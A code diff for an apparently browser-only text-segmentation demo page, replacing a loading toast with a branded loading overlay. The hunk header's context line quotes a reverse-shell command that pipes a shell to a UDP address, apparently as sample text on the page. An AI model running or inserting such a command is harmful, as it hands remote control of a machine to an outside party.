@@ -131,13 +131,17 @@ sh -i >& /dev/udp/10.10.10.10/9001 0>&1
     Client-side demo only. No text leaves your browser.
   </footer>
 
-  <div id="runtimeToast" class="runtime-toast" data-state="loading" role="status" aria-live="polite" aria-hidden="true">
-    <span class="runtime-toast-icon" aria-hidden="true">
-      <span class="rt-spinner"></span>
-      <svg class="rt-check" viewBox="0 0 24 24" width="16" height="16" fill="none"><path d="M5 12.5l4 4L19 7"/></svg>
-      <svg class="rt-cross" viewBox="0 0 24 24" width="16" height="16" fill="none"><path d="M6.5 6.5l11 11M17.5 6.5l-11 11"/></svg>
-    </span>
-    <span class="runtime-toast-text">Loading browser runtime&hellip;</span>
+  <div id="runtimeOverlay" class="runtime-overlay" data-state="loading" role="status" aria-live="polite" aria-hidden="true">
+    <div class="runtime-overlay-card">
+      <div class="runtime-overlay-brand"><span class="brand-type">Type</span><span class="brand-seg">Seg</span></div>
+      <div class="runtime-overlay-icon" aria-hidden="true">
+        <span class="rt-spinner"></span>
+        <svg class="rt-check" viewBox="0 0 24 24" width="40" height="40" fill="none"><path d="M5 12.5l4 4L19 7"/></svg>
+        <svg class="rt-cross" viewBox="0 0 24 24" width="40" height="40" fill="none"><path d="M6.5 6.5l11 11M17.5 6.5l-11 11"/></svg>
+      </div>
+      <div class="runtime-overlay-title">Loading browser runtime&hellip;</div>
+      <div class="runtime-overlay-sub">Warming up the in-browser model</div>
+    </div>
   </div>
 
   <dialog id="settingsModal" class="modal" style="border:1px solid var(--border); border-radius:var(--radius); padding:0; max-width:400px; box-shadow:var(--shadow);">
